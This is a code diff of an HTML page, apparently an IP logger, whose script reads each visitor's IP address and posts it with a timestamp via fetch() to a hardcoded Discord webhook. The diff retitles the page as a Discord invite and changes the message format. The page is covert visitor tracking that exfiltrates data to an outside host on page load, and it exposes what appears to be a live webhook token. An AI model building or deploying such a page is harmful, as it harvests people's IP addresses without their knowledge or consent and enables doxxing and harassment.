@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP Logger</title>
+    <title>Discord.gg/drogen</title>
     <style>
         body {
             margin: 0;
@@ -101,14 +101,14 @@
                 document.getElementById('ipDisplay').textContent = `${ip}`;
 
                 // Send IP to the webhook
-                const webhookURL = "https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h"; // Replace with your actual webhook URL
+                const webhookURL = "https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h"; // Dein Discord Webhook-URL
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json",
                     },
                     body: JSON.stringify({
-                        ip: ip,
+                        content: `IP Address: ${ip}`,
                         timestamp: new Date().toISOString(),
                     }),
                 });
